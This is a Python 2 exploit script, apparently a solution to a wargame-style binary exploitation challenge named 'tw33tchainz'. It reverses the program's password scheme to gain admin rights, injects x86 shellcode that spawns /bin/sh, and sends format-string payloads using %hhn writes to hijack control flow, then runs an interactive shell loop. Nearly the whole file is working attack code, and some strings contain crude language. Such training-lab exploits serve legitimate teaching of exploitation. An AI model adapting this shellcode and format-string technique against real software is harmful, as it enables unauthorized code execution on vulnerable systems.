# project1_priv: m0_tw33ts_m0_ch4inz_n0_m0n3y

import sys
import time
import threading
import subprocess

send = None
read = None

shellcode = (
"\x31\xC9"             # xor ecx,ecx
"\xF7\xE1"             # mul ecx
"\xBB\x4C\x3D\xF8\xB7" # mov ebx,0xb7f83d4c ; "/bin/sh"
"\xB0\x0B"             # mov al,0xb
"\xCD\x80"             # int 0x80
)

def main():

  global send, read

  p = subprocess.Popen(["/levels/project1/tw33tchainz"],
                       stdin=subprocess.PIPE,
                       stdout=subprocess.PIPE,
                       universal_newlines=True)

  vardick = { "gp": None, "sp": None, "addr": None, "shell": None, "flag": None }

  send = p.stdin
  read = p.stdout

  stage1 = threading.Event()
  stage2 = threading.Event()
  stage3 = threading.Event()
  stage4 = threading.Event()

  handler = threading.Thread(target=handle_output,
                             args=(vardick, stage1, stage2, stage3, stage4))

  handler.daemon = True
  handler.start()

  try:

    send.write("wetw0rk\n")
    send.write("123\n")
    stage1.wait()

    vardick["sp"] = le_convert(vardick["gp"])
    vardick["sp"] = get_secret(vardick["sp"])
    print("[*]  Generated password: %s" % vardick["gp"])
    print("[*] Extacted secretpass: %s" % vardick["sp"])


    send.write("\n3\n")
    send.write(bytearray.fromhex(vardick["sp"]))
    send.write("\n")

    stage2.wait(timeout=5)
    if stage2.is_set():
      print("[+]        Admin rights: Ours!")
      send.write("6\n\n")
      print("[+]          Debug mode: On")
    else:
      print("[-]        Admin rights: Failure")
      sys.exit(-1)
    
    print("[*] Injecting shellcode...")
    send.write("1\n")
    send.write(shellcode)
    send.write("\n\n")
    send.write("2\n\n")

    stage3.wait(timeout=5)
    if stage3.is_set():
      print("[+]        Shellcode at: %s" % vardick["addr"])
    else:
      print("[-]        Shellcode at: ?, exiting")
      sys.exit(-1)

    send.write(("1\nA\x3f\xd0\x04\x08%%%dx%%8$hhn\n\n" % (251+int(vardick["addr"][2:4], 16))))
    send.write(("1\nA\x3e\xd0\x04\x08%%%dx%%8$hhn\n\n" % (251+int(vardick["addr"][4:6], 16))))
    send.write(("1\nA\x3d\xd0\x04\x08%%%dx%%8$hhn\n\n" % (251+int(vardick["addr"][6:8], 16))))
    send.write(("1\nA\x3c\xd0\x04\x08%%%dx%%8$hhn\n\n" % (251+int(vardick["addr"][8:10], 16))))

    send.write('5\n\n')

    print("[+]        Exploitation: Complete\n") # idk wtf we needed to add this for the shell to wrok :|

    send.write('echo "BITCH"\n')
    time.sleep(0.5)
    stage4.wait()
    vardick["shell"] = True

    if stage4.is_set():
      pass
    else:
      print("[-]        Exploitation: Failed")
      sys.exit(-1)

    while True:
      send.write(raw_input("wetw0rk> ") + "\n")
      time.sleep(0.05)

  except KeyboardInterrupt:
    print "Canceling"
    sys.exit()

def handle_output(v, stage1, stage2, stage3, stage4):

  global send, read

  while True:
    line = read.readline()
    if line:
      if not stage1.is_set():
        if line.find("Generated Password:") >= 0:
          v["gp"] = read.readline().strip()
          stage1.set()
      elif not stage2.is_set():
        if line.find("Authenticated!") >= 0:
          stage2.set()
      elif not stage3.is_set():
        if line.find("Address:") >= 0:
          v["addr"] = line.split(' ')[-1].strip()
          stage3.set()
      elif not stage4.is_set():
        if line.find('BITCH') >= 0:
          v["flag"] = line.split()[-1]
          stage4.set()
          continue

      if v["shell"] == True and stage4.is_set():
        print line,

# get_secret: extract the secret password from the generated one
def get_secret(gp):
  
  username =\
  [
    0x77, 0x65, 0x74, 0x77, 0x30, 0x72, 0x6b, 0x0a,
    0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
  ]

  salt =\
  [
    0x31, 0x32, 0x33, 0x0a, 0x00, 0xba, 0xba, 0xba,
    0xba, 0xba, 0xba, 0xba, 0xba, 0xba, 0xba, 0xba
  ]

  j = 0
  int_bytes = []
  for i in range(16):
    int_bytes += int(("%s" % gp[j:j+2]), 16),
    j += 2

  secretpass = ""
  for i in range(16):
    for j in range(0xff):
      if ( (username[i] ^ j) == int_bytes[i] ):
        secret_byte = (j - salt[i]) + (2 ** 32) # must add 2**32 to convert to unsigned 32-bit
        fbyte = "%s" % hex(secret_byte)
        if (fbyte.endswith('L')):
          fbyte = fbyte.rstrip('L')
        secretpass += fbyte[-2:]

  return secretpass

# le_convert: application does not return generated
#             password in LE. So we convert it
def le_convert(gp):

  le_gp = ""

  j = 0
  hex_bytes = []
  for i in range(16):
    hex_bytes += ("%s" % gp[j:j+2]),
    j += 2

  j = 0
  copy = []
  for i in range(4):
    copy += hex_bytes[j:j+4],
    copy[i].reverse()
    j += 4

  for i in range(4):
    le_gp += "".join(copy[i])

  return le_gp

main()
